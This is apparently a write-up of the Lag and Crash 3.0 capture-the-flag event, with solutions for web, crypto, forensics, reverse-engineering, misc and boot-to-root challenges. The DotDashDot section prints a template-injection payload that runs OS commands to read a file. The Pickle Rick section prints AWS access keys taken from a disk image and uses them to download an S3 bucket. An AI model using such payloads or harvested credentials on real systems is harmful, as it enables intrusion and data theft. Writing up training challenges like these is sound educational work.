# Lag and Crash 3.0

https://ctf.lagncra.sh/challenges

## Challenges

### Web
- [DotDashDot](#dotdashdot)
- [The Password](#the-password)

### Crypto
- [You Don't Know About Us](#you-dont-know-about-us)
- [Zig Zag](#zig-zag)
- [Hope](#hope)

### Forensics
- [Base Madness](#base-madness)
- [Wave](#wave)
- [Incompetent](#incompetent)
- [Embedment](#embedment)

### Reverse
- [First Program](#first-program)

### Misc
- [Hidden in Plain Sight](#hidden-in-plain-sight)
- [Swiftly](#swiftly)

### Boot to root
- [Pickle Rick](#pickle-rick)

<br />

-------

<br />

## Web

### DotDashDot

Description: _An ancient relic of the past... what's it doing here?_

http://dotdashdot.d.lagncra.sh

There is one comment in html source 

<img width="233" alt="image" src="https://user-images.githubusercontent.com/79740895/231981877-0bf5621b-99ad-444c-8fa1-f42b2e848fcf.png">

http://dotdashdot.d.lagncra.sh/translate

<img width="475" alt="image" src="https://user-images.githubusercontent.com/79740895/231982345-cbbd17fb-bd74-4f22-97bf-d8e29d99f035.png">

It will convert our input to morse code and it is vulnerable to SSTI.

test payload: `--> {{8*8}}`

<img width="330" alt="image" src="https://user-images.githubusercontent.com/79740895/231982840-ee4dbd56-8c82-4a10-bda5-89f553eabe49.png">

Now we can use RCE payload to read flag

Payload: `-->{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /www/flag.txt').read() }}`

<img width="458" alt="image" src="https://user-images.githubusercontent.com/79740895/231983204-6f38a96f-67a4-4d83-a804-54b622a1c631.png">

```
flag: LNC2023{T3mpl4t35_4r3_c00L_bUt_d4nG3r0u5_776843}
```

<br />

### The Password

Description: _You stumble across a secret website that asks for your password..._

_thepassword.s.lagncra.sh_

flag is in the js file.

http://thepassword.s.lagncra.sh/password.js

```
flag: LNC2023{s0m3t1me$_1t_i5_pr377y_s1aY}
```


<br />

----------

<br />

## Crypto

### You Don't Know About Us

Description: _You ain’t gonna understand our language!

JZUWGZJAORZHSIDIOVWWC3RBEBKGQ2LTEBUXGIDUNBSSAYLDOR2WC3BAMVXGG33EMVSCA3LFONZWC43HMU5AUQSEKMZDAMRTPN2GWY3SORVWG4T5_

It is Base32 > Rot 10(Rot13 with n=10)

```
flag:  LNC2023{dumbdumb}
```

<br />

### Zig Zag

Description: _Oh shoot, I should build some RAIL with FENCE._

_N2ISTVSLC03HSAQIEBIU2TWUOO_

It is Rail Fence (Zig-Zag) Cipher

Decoder for reference: https://www.dcode.fr/rail-fence-cipher

```
flag: LNC2023{THISWASQUITEOBVIOUS}
```

<br />

### Hope

Description: _Can you find the reason why the survivals are still surviving? The reason for their strong suvival skills can be found after decrypting their message. Flag format is LNC2023{flag}_

attached file: message.txt

it contains following:

Encoded Key: 36f9a5900a637b0248cf7c8fe3af44ca

Encoded Message: ...- -.-- .. .. .. .-- -- .-.. .-- -..-

Encoded Key is md5 hash of `SUPERKEY`. https://crackstation.net/

Encoded Message is Morse code which decode to `VYIIIWMLWX`

It is [Vigenere Cipher](https://www.dcode.fr/vigenere-cipher) and key to decrypt is `SUPERKEY`

decoded text is `DETERMINED`

```
flag: LNC2023{DETERMINED}
```



<br />

---------

<br />

## Forensics

### Base Madness

Description: _Zip files and encryptions were used often in the modern times. You came across this 2 files. One containing a text one is a zip file. Are you able to decipher it?_

two files are given: base_madness.txt, base_madness.zip

base_madness.txt is base64 encoded: `thisisthepasswordtounlockthefile`

unzip the file with this file. There is one image ayaka.jpg 

open this image with notepad there is flag.

<img width="361" alt="image" src="https://user-images.githubusercontent.com/79740895/231988288-e124c423-d078-4d08-ae81-70ea09e39c77.png">

```
flag:  LNC2023{ayaka_is_key}
```

<br />

### Wave

Description: _I love this spectrum. My kind of vibe._

Attached file: wave.wav

As the description suggests flag is in Spectrogram of audio file.

<img width="644" alt="image" src="https://user-images.githubusercontent.com/79740895/232098960-27cf44d3-794c-4bd8-ae6b-45e746c6e211.png">

Tool used: Sonic Visualizer

```
flag: LNC2023{annoyingwave}
```

<br />

### Incompetent

Description: _This is a sample description for my awesome challenge_

Attached file: secret.zip

unzip the file and there are two more file: Homework.zip, password.docx (inside folder name Important)

Homework.zip have flag.docx inside but it is password protected. Password is in password.docx but not visible to us because it is in strings.

<img width="167" alt="image" src="https://user-images.githubusercontent.com/79740895/232106248-e53a58da-7da7-47bd-97cc-154b9cf750d2.png">

Reference: https://gchq.github.io/CyberChef/

password: ` kimiwadekinaiko `

Now we can open flag.docx but flag is not visible because again it is in strings.

<img width="196" alt="image" src="https://user-images.githubusercontent.com/79740895/232106899-797dd885-701a-457a-bc9a-feed22f19014.png">

```
flag: LNC2023{konoyodeichibandekinaiko}
```

### Embedment

Description: _It looks like there is a secret message that is embeded into the picture. Find a way to retrieve the embeded materials from the image to obtain the flag._

attached file: [Flag.jpg](https://user-images.githubusercontent.com/79740895/232201150-433884d6-e09f-4c73-ada8-9ddc9e2b9f3f.jpg)

word document file is embedded in this image.

to extract right click on image open with 7z as archive and save extracted files.

<img width="214" alt="image" src="https://user-images.githubusercontent.com/79740895/232201217-31618063-c885-4878-a448-6fe4b5581c6d.png">

compress this extracted file to zip and rename to `flag.docx` now it will open as word document.

<img width="324" alt="image" src="https://user-images.githubusercontent.com/79740895/232201487-92cf08ea-1f0c-4efc-b246-325ee348fb2e.png">

```
flag: LNC2023{S3cr3tF1aG}
```







<br />

-------

<br />

## Reverse

### First Program

Description: _This is the first program that was created in the Dystopian times can you help find the flag inside it?_

one file is given: simplere

simplere: ELF 64-bit LSB pie executable

open this in Ghidra

we can see flag in side main()

<img width="268" alt="image" src="https://user-images.githubusercontent.com/79740895/232018262-723d7321-8bc6-47dd-b149-d2645c67e656.png">

```
flag: LNC2023{s1mpl3_4m_1_r1ghT?}
```












<br />

--------

<br />

## Misc

### Hidden in Plain Sight

Description: _UGH Ansi screwed up again! I wonder what sequence of events lead to this._

nc nc.lagncra.sh 8004

connecting to this is not showing anythig so let's try to save this in file.

<img width="247" alt="image" src="https://user-images.githubusercontent.com/79740895/232020790-da910eb6-16cf-4283-9c65-8220a2c03f61.png">

open this file with editor

<img width="242" alt="image" src="https://user-images.githubusercontent.com/79740895/232021141-395e8cbb-aa7b-4f72-8ba6-df3eb2c2348a.png">

There is flag. 

less command also works. ` cat 1.txt |less `

```
flag: LNC2023{ans1_c0ntr0l_s3qu3nc3s_damn_c00l}
```

<br />

### Swiftly

Description: _Looks like the message from the military to all remaining survivals have been damaged, find a way to read all the qr code to obtain the flag._

attached file: [Flag.gif](https://user-images.githubusercontent.com/79740895/232199504-0b1add77-b1c7-44e6-8cf5-b430c433b3d3.gif)

to get the flag we have to extract the frames from gif: ` ffmpeg -i Flag.gif -vsync 0 out%d.png `

and read the qr from extracted frames: ` zbarimg out* -q | sed 's/QR-Code://g' | tr '\n' '\0' `

<img width="260" alt="image" src="https://user-images.githubusercontent.com/79740895/232200271-397f1cea-8a5d-424b-9138-102a5ac0ebe9.png">

```
flag: LNC2023{Are_y0u_FaSt_En0ugh_4_th1s}
```







<br />

----------

<br />

## Boot to root

### Pickle Rick

Description: _Rick has turned himself into a pickle, can you find him before its too late..._

Download: https://drive.google.com/file/d/1ZULGK4p7cJQHNabmDHdtki-g1xNfHu0f/view?usp=share_link

_7z Password: &y9PBYf8gZ^996s9_

After unzip we have pickle-shop.ova file we can use VMWare to run this machine but if we only want to see the file system we can do
 that with tools like 7z.
 
 right click on pickle-shop.ova and open with 7z as archive 
 
 <img width="471" alt="image" src="https://user-images.githubusercontent.com/79740895/232049128-950a28f4-2c9c-48e3-8d92-8d3a8a69931c.png">
 
 after looking many files we found aws credentials ` pickle-shop.ova\pickle-shop-disk1.vmdk\2.img\root\.aws\credentials `
 
 <img width="443" alt="image" src="https://user-images.githubusercontent.com/79740895/232049998-89d097e0-c768-4f8d-b709-dddcfb4dc9cb.png">

we found following credentials:
```
aws_access_key_id = AKIAZNKM5ODGICECDW5U
aws_secret_access_key = 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
```

configure awscli with these credentials: ` aws configure `

<img width="413" alt="image" src="https://user-images.githubusercontent.com/79740895/232050623-7a6151b3-7a61-47c3-9c26-6e1317c03c37.png">

Let's check for s3 buckets: ` aws s3 ls `

<img width="229" alt="image" src="https://user-images.githubusercontent.com/79740895/232050882-fdb89b1a-1887-4fab-b3c7-9863cbfa81a9.png">

download the s3 bucket: ` aws s3 sync s3://lnc-pickle-shop . `

<img width="282" alt="image" src="https://user-images.githubusercontent.com/79740895/232051377-7a2e3e49-2503-4429-a2f7-04f4cc457ecc.png">

flag is in this bucket

<img width="158" alt="image" src="https://user-images.githubusercontent.com/79740895/232051469-3bae4a11-bf47-4060-bce1-b98c8f0d1186.png">

```
flag: LNC2023{1m_p1ckl3_r1111ck}
```





<br>

:octocat: Happy Hacking :octocat:


